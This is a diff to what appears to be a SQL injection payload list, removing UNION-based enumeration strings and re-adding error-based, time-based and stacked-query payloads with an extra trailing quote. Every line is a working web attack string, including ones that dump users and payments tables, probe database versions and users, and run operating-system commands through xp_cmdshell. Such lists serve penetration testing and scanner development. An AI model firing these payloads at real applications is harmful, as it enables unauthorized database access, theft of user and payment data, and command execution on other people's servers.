@@ -412,47 +412,22 @@ admin' AND 1=1--
 %22 OR 1=1-- 
 %27 AND 1=1-- 
 %22 AND 1=1-- 
-%27 UNION SELECT 1, DATABASE()-- 
-%22 UNION SELECT 1, USER()-- 
-' UNION SELECT NULL, current_user-- 
-' UNION SELECT NULL, session_user-- 
-' UNION SELECT current_database(), current_user-- 
-' UNION SELECT 1, database()-- 
-' UNION SELECT 1, user()--  
-' UNION SELECT version(), null--  
-' UNION SELECT NULL, NULL-- 
-' UNION SELECT 1, 'password' FROM users-- 
-' UNION SELECT 1, table_name FROM information_schema.tables-- 
-' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'-- 
-' UNION SELECT NULL, table_schema, table_name FROM information_schema.tables-- 
-' AND 1=CONVERT(int, (SELECT CASE WHEN (1=1) THEN 1 ELSE CAST(1 AS INT) END))-- 
-' AND 1=CONVERT(int, (SELECT CASE WHEN (1=2) THEN 1 ELSE CAST(1 AS INT) END))-- 
-' UNION SELECT NULL, banner FROM v$version-- 
-' UNION SELECT table_name FROM all_tables-- 
-' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'-- 
-' AND 1=CONVERT(int, @@version)-- 
-' AND 1=CONVERT(int, DATABASE())-- 
-' AND 1=CONVERT(int, USER())-- 
-' AND 1=CAST(version() AS int)-- 
-' AND 1=CAST(DATABASE() AS int)-- 
-' AND 1=CAST(USER() AS int)-- 
-' AND SLEEP(5)-- 
-' AND pg_sleep(5)-- 
-' AND BENCHMARK(5000000, MD5(1))-- 
+' AND 1=CONVERT(int, (SELECT CASE WHEN (1=1) THEN 1 ELSE CAST(1 AS INT) END))-- '
+' AND 1=CONVERT(int, (SELECT CASE WHEN (1=2) THEN 1 ELSE CAST(1 AS INT) END))-- '
+' AND 1=CONVERT(int, @@version)-- '
+' AND 1=CONVERT(int, DATABASE())-- '
+' AND 1=CONVERT(int, USER())-- '
+' AND 1=CAST(version() AS int)-- '
+' AND 1=CAST(DATABASE() AS int)-- '
+' AND 1=CAST(USER() AS int)-- '
+' AND SLEEP(5)-- '
+' AND pg_sleep(5)-- '
+' AND BENCHMARK(5000000, MD5(1))-- '
 ' AND IF(1=1, SLEEP(5), 0)-- 
-' AND IF(1=1, pg_sleep(5), 0)-- 
-1 AND SLEEP(5)-- 
-1 AND pg_sleep(5)-- 
-'; SELECT * FROM users-- 
-'; EXEC xp_cmdshell('ping 10.10.1.1')-- 
-'; EXEC sp_executesql N'SELECT @@version'-- 
+' AND IF(1=1, pg_sleep(5), 0)-- '
+1 AND SLEEP(5)-- '
+1 AND pg_sleep(5)-- '
+'; SELECT * FROM users-- '
+'; EXEC xp_cmdshell('ping 10.10.1.1')-- '
+'; EXEC sp_executesql N'SELECT @@version'-- '
 '; EXEC('SELECT * FROM users WHERE username=''admin''')-- 
-'; EXEC('SELECT * FROM orders WHERE order_id=102')-- 
-'; EXEC('SELECT * FROM payments WHERE user_id=1')-- 
-' UNION SELECT 1, user(), database()-- 
-' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database()-- 
-' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'-- 
-admin' UNION SELECT NULL, table_name FROM information_schema.tables-- 
-admin' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=DATABASE()-- 
-admin' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'-- 
-admin' UNION SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE()-- 
